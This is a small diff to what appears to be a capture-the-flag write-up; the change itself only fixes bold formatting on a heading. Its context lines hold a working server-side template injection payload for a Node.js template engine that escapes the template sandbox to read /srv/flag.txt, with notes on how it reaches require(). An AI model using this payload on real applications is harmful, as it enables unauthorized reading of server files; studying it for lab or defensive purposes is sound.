@@ -198,7 +198,7 @@ Why this works:
 <%- (function(){ try { return this.constructor.constructor('return process.mainModule.require("fs").readFileSync("/srv/flag.txt","utf8")')() } catch(e){ return e.toString() } })() %>
 ```
 
-**What this does:
+**What this does:**
 
 - Uses Node's `fs.readFileSync(path, 'utf8')` to read a file as text.
 - `process.mainModule.require('fs')` is used as a reliable way to reach `require()` from the template context.
